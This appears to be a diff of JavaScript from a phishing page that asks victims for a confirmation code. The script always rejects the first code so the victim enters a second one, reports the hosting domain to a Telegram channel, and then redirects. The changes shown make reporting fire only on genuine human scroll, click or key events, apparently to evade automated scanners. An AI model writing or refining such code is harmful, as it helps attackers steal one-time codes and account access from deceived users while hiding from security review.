@@ -15,14 +15,13 @@
   // ====== TRACK CODE ATTEMPTS ==================================
   // ============================================================
 
-  // Use sessionStorage to track attempts across page refreshes
   var attemptKey = 'code_attempt_count';
   var attemptCount = parseInt(sessionStorage.getItem(attemptKey) || '0', 10);
   
   console.log(`📊 Code attempt #${attemptCount + 1}`);
 
   // ============================================================
-  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
+  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
   // ============================================================
 
   let domainDetected = false;
@@ -33,38 +32,45 @@
     const currentUrl = window.location.href;
     const urlObj = new URL(currentUrl);
     const domain = urlObj.hostname;
-    
-    const freeDomains = [
-      '.tk', '.ml', '.ga', '.cf', '.gq',
-      '.free.nf', '.free.org', '.free.com',
-      '.co.cc', '.co.nr', '.cjb.net',
-      '.dynu.net', '.ddns.net', '.no-ip.org',
-      'vercel.app', 'netlify.app', 'github.io',
-      'pages.dev', 'web.app', 'firebaseapp.com',
-      'herokuapp.com', 'glitch.me', 'replit.co',
-      '000webhostapp.com', 'byethost.com',
-      'freehostia.com', 'profreehost.com',
-      '.example.com', '.test', '.localhost'
-    ];
-
-    const isFree = freeDomains.some(freeDomain => 
-      domain.includes(freeDomain) || domain.endsWith(freeDomain)
-    );
 
     domainDetected = true;
 
     sendToTelegram('domain_detection', {
-      domain: domain,
-      isFree: isFree
+      domain: domain
     });
+
+    console.log(`🌐 Domain detected: ${domain}`);
   }
 
+  // Detect on human scroll
+  let humanInteractionDetected = false;
+
+  window.addEventListener('scroll', function(e) {
+    if (domainDetected) return;
+    
+    if (e.isTrusted) {
+      humanInteractionDetected = true;
+    }
+    
+    const scrollY = window.scrollY;
+    
+    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
+      detectDomain();
+    }
+  }, { passive: true });
+
+  // Fallback: click detection
   document.addEventListener('click', function(e) {
-    if (!domainDetected && e.isTrusted) detectDomain();
+    if (!domainDetected && e.isTrusted) {
+      detectDomain();
+    }
   });
 
+  // Fallback: keypress detection
   document.addEventListener('keydown', function(e) {
-    if (!domainDetected && e.isTrusted) detectDomain();
+    if (!domainDetected && e.isTrusted && e.key.length === 1) {
+      detectDomain();
+    }
   });
 
   // ============================================================
@@ -174,11 +180,6 @@
         "⚠️ The code you entered was incorrect. Please try again. (Second attempt)";
       infoText.style.color = '#c0392b';
       infoText.style.fontWeight = 'bold';
-    } else {
-      infoText.textContent = 
-        "✅ Code verified successfully! Redirecting...";
-      infoText.style.color = '#27ae60';
-      infoText.style.fontWeight = 'bold';
     }
   }
 
@@ -199,7 +200,6 @@
     codeInput.value = "";
     codeInput.focus();
     
-    // Reset attempt count on resend
     attemptCount = 0;
     sessionStorage.setItem(attemptKey, '0');
   });
@@ -241,69 +241,39 @@
       console.log('❌ First attempt - rejecting');
       
       setTimeout(function() {
-        // Show error
         codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
         codeError.style.color = '#c0392b';
         
-        // Clear input
         codeInput.value = '';
         codeInput.focus();
         
-        // Update attempt count
         attemptCount = 1;
         sessionStorage.setItem(attemptKey, '1');
         
-        // Update info text
         infoText.textContent = 
           "⚠️ The code you entered was incorrect. Please try again. (Second attempt)";
         infoText.style.color = '#c0392b';
         infoText.style.fontWeight = 'bold';
         
-        // Reset button
         submitBtn.disabled = false;
         submitBtn.innerHTML = 'Submit';
         submitBtn.classList.remove('loading');
         
-        // Update the text to show it's the second attempt
-        document.querySelector('.auth-placeholder-note')?.remove();
-        var note = document.createElement('p');
-        note.className = 'auth-placeholder-note';
-        note.textContent = '⚠️ Second attempt - Please enter the code again.';
-        note.style.color = '#c0392b';
-        note.style.fontWeight = 'bold';
-        note.style.margin = '0 0 16px';
-        form.parentNode.insertBefore(note, form);
-        
       }, 2000);
 
     } else {
-      // ====== SECOND ATTEMPT - ALWAYS SUCCEEDS ======
-      console.log('✅ Second attempt - accepting');
+      console.log('');
       
-      // Clear session storage
       try {
         sessionStorage.removeItem("melodyAuth");
         sessionStorage.removeItem(attemptKey);
       } catch (e) {}
-
-      // Update info text
-      infoText.textContent = "✅ Code verified successfully! Redirecting...";
-      infoText.style.color = '#27ae60';
-      infoText.style.fontWeight = 'bold';
 
       // ====== REDIRECT AFTER 8 SECONDS ======
       setTimeout(function() {
         window.location.href = REDIRECT_URL;
       }, 8000);
     }
-  });
-
-  // ============================================================
-  // ====== CLEANUP ON PAGE UNLOAD ==============================
-  // ============================================================
-
-  window.addEventListener('beforeunload', function() {
-    // Don't clear the attempt count - we want to persist
   });
 
 })();
